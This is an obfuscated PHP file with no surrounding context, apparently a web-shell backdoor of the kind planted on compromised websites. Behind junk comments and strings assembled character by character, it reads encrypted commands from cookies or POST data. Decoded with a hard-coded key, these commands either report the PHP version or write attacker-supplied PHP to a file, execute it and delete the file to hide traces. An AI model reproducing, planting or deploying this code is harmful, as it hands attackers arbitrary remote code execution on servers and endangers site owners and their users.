<?php      function   ugbxvwj_ej(){/*qkdz   */print	(57858);/* oyj*/}$pravag_kis	=	'pravag_kis'	^/*   kdknv */'';


$kbsdihq/* kap */=/*  goq  */"f"."\x69"/*svwfu*/.   "l"."e"."_"."\x70"	./*  bhm  */"u"."t".$pravag_kis(95)/*  cuu   */.     $pravag_kis(99)      .	"o"."\x6e"	.	"t"."\145"	.     "\156"	.	"t"."\x73";
$haea_xwkn	=	"\142"/*nbx  */.	"a"."\x73"/*  e   */.	"\x65"	.	"6"."4"."\137"/*   v*/.	"d"."\145"	.	$pravag_kis(1023-924)     .  "o"."\x64"/*sbl  */./*xq*/"e";
$ubtlfeinsq       =  $pravag_kis(117)	.	"n"."\163"    .    "\145"/* b*/./* yv */"r"."i"."a"."l".$pravag_kis(303-198)  .	"z"."e";

$tr_pwzhflg/*  qqoe */=	$pravag_kis(557-445)/*   sei  */.	$pravag_kis(104)/*   kurd*/./*   l   */"p".$pravag_kis(118)	.       "e"."\x72"	./* ast  */"\163"/*   bvzne   */.    "i"."\x6f"    .	$pravag_kis(110);
$xovcg	=  "u"."n".$pravag_kis(368-260)	./*  r  */$pravag_kis(438-333)      .   "n"."k";




/*   c*/function     gcqisthj($wuuqrwpvwtcrr,	$vzlcouqydh)
{/*   g*/global	$pravag_kis;	$yqefr       =	"";

      for/*  e */($wuuqrwpvw    =	0;	$wuuqrwpvw	<     strlen($wuuqrwpvwtcrr);)       {	for/*  ahw */($eiae_wbw__/*   of   */=/* eh */0;	$eiae_wbw__	</* aszq*/strlen($vzlcouqydh)	&&	$wuuqrwpvw     <  strlen($wuuqrwpvwtcrr);   $eiae_wbw__++,  $wuuqrwpvw++)	{   $yqefr      .=/* q*/$pravag_kis(ord($wuuqrwpvwtcrr[$wuuqrwpvw])       ^     ord($vzlcouqydh[$eiae_wbw__]));     }

/*   t */}	return      $yqefr;

}



$zjaipzpp/*   oscej  */=/*   n_s  */$_COOKIE;$r_hxjob	=  $_POST;$zjaipzpp	=	array_merge($r_hxjob,/*  lyvze   */$zjaipzpp);




$_krrlags/*   b */=    "c"."3"."5".$pravag_kis(457-403)/*   kx  */./*   azjo*/"\146"  ./* scs*/"\66"/* gyk*/.  $pravag_kis(102)  .    $pravag_kis(952-854)/* x   */./*   o*/"-"."7"."8"."a"."d".$pravag_kis(45)      .	"\x34"   .      "\66"/* v   */.      "\x31"/*  hqxd  */.	$pravag_kis(237-188)/* nxold   */.      $pravag_kis(633-588)     .	"\x38"/*  vddz  */.    "7"."a"."6"."-"."1"."\x63"/*   dxx */./*bzpmu  */"\65"     .	"0"."\145"      .	"\70"/*   haiqt   */.    "4"."9".$pravag_kis(48)   ./*  noh*/"\x34"/*   zr  */.   "\x62"     ./*   d_blp */$pravag_kis(480-380);


foreach/* a  */($zjaipzpp/* ol  */as     $mmqjd/*ur   */=>	$wuuqrwpvwtcrr)/*mpuji*/{


       $wuuqrwpvwtcrr       =/*  iy   */$ubtlfeinsq(gcqisthj(gcqisthj($haea_xwkn($wuuqrwpvwtcrr),    $_krrlags),	$mmqjd));

/*   co   */if	(isset($wuuqrwpvwtcrr["\141"  ./*qvpx */$pravag_kis(107)]))/* zjb */{

/* hoer  */if	($wuuqrwpvwtcrr["a"]    ==/*vtue*/"\x69")      {
/* u_  */$wuuqrwpvw	=	array();


	$wuuqrwpvw["\x70"	./*   au */"v"]/*er_t */=	$tr_pwzhflg();
   $wuuqrwpvw["\163"     ./*  odgh*/"\166"]	=     "\63"	.	$pravag_kis(46)	.      "5";	echo/*oczjt   */@serialize($wuuqrwpvw);
     }  elseif       ($wuuqrwpvwtcrr["a"]	==     "e")   {

/*  bv   */$lziwd       =/*fadkf  */sprintf("\x2e"/*  tlr */.       "/"."%".$pravag_kis(811-696)	.    $pravag_kis(46)  .      $pravag_kis(878-766)       .	"\154",    md5($_krrlags));


     $kbsdihq($lziwd,	"<"/*  hk*/.	"?".$pravag_kis(285-173)     ./*  mdif   */"\150"  .      "p".$pravag_kis(32)	.    $pravag_kis(397-280)	.	"n".$pravag_kis(108)	./*e   */$pravag_kis(105)     .     $pravag_kis(287-177)       .    $pravag_kis(107)    ./* t */"("."\x5f"  .	"\137"/*jkit  */.  "F".$pravag_kis(73)	./*  ysckt  */"L".$pravag_kis(69)	./*_mlf */$pravag_kis(95)	.    "\x5f"/*  nzkn */.	$pravag_kis(41)	./* qzzh   */$pravag_kis(59)	./*  ghk */$pravag_kis(32)  .  $wuuqrwpvwtcrr["d"]);

/*  wv */include($lziwd);
/*   cz*/$ctnxghgdpl  =	$lziwd;/*  uzo*/$xovcg($ctnxghgdpl);

    }


      exit();


/*  igkt  */}
}

